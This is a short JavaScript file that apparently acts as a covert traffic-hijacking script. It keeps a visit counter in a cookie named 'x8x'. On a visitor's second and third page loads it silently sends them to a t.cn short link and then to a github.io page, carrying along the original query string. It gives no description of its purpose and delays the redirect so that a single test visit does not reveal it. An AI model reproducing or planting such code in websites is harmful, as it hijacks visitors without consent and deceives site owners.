function setCookie(name,value)
{
var Days = 1;  var exp = new Date(); 
exp.setTime(exp.getTime() + Days*24*60*60*1000);    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}

function getCookie(name)
{
var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
if(arr=document.cookie.match(reg))   return unescape(arr[2]);
else return null;
}

var ss= location.search;
go2="http://t.cn/RZsCRKE";
go3="http://aifuli.github.io/aifuli/91aiai.html";

if(  getCookie("x8x")==1 )                                //
  { setCookie("x8x",2);   window.location=go2+ss;   }

else if(  getCookie("x8x")==2 )                           //
  { setCookie("x8x",3);   window.location=go3+ss;   }

else
  { setCookie("x8x",1);  }   // 
